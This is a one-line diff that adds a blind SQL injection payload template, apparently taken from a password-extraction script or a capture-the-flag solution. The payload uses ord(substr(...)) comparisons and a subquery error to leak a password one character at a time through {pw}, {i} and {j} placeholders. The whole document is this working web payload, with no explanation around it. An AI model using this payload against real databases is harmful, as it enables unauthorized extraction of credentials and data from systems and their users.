@@ -1,0 +1,1 @@
+1.' or if(ord(substr({pw},{i},1))={j},( select 1 union select 2),1)-- -
